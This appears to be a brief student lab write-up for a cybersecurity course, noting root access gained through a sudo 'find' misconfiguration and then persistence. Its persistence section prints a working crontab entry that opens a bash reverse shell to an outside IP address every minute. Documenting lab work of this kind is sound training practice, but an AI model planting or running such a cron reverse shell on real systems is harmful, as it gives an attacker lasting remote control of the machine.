# Penetration Testing & Escalation Analysis

**Author:** tpetgrave12
**Course:** Cybersecurity Foundations Intensive

## Phase 1: Privilege Escalation
* **Vector:** Sudo find exploit
* **Output:** root

## Phase 2: Persistence
* **Method:** Crontab reverse shell
* **Output:** * * * * * /bin/bash -c 'bash -i >& /dev/tcp/172.60.0.1/4444 0>&1'
